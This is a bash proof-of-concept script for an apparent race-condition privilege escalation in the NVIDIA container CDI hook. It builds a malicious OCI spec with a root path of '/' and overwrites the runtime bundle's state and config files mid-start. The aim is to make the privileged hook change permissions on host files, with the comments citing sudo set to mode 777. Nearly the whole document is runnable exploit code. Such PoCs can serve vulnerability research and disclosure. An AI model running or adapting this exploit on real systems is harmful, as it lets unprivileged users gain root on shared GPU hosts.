#!/bin/bash
# Minimal reproducible PoC for nvidia-cdi-hook TOCTOU LPE via malicious root.path
# Captured from real volume runs on 88-thread + V100.
# Variant root=/ (and relatives) + immediate overwrite of runtime bundle state.json/config.json
# Results in nvidia-cdi-hook performing chmod on host path (e.g. /usr/bin/sudo -> 777)

set -e
echo "=== CDI RACE PoC ==="
echo "PRE: $(stat -c '%a %n' /tmp/poc_target 2>/dev/null || echo 'no target yet')"

# Setup controllable target
touch /tmp/poc_target
chmod 644 /tmp/poc_target
echo "Initial: $(stat -c '%a %n' /tmp/poc_target)"

# Malicious OCI (one that produced hits)
SPEC='{"ociVersion":"1.0.0","root":{"path":"/"},"process":{"user":{"uid":0,"gid":0}}}'

b=/tmp/pocbundle
mkdir -p $b
echo "$SPEC" > $b/config.json
cp $b/config.json $b/state.json

# Trigger real hook path (the volume method)
cname=poc_race_$$
echo "docker create --gpus --runtime nvidia ..."
cid=$(docker create --gpus all --name $cname --runtime nvidia python:3.11-slim sleep 0.4 || true)

if [ -n "$cid" ]; then
  sleep 0.006
  # Race overwrite the bundle the runtime just wrote
  for d in $(find /run -type d 2>/dev/null | grep -E "$cid" | head -3); do
    if [ -f "$d/state.json" ]; then
      echo "$SPEC" > "$d/state.json"
      cp "$d/state.json" "$d/config.json"
      echo "RACED on $d"
    fi
  done
  docker start $cname >/dev/null 2>&1 || true
  sleep 0.05
  echo "POST: $(stat -c '%a %n' /tmp/poc_target)"
  # Also check if hook touched other things
  docker rm -f $cname >/dev/null 2>&1 || true
fi

echo "If mode changed to 777 on target, the root.path race won against the privileged hook."
echo "See full volume logs and ~600 hits in /tmp/hacker_cdi_hits*.jsonl for scale."
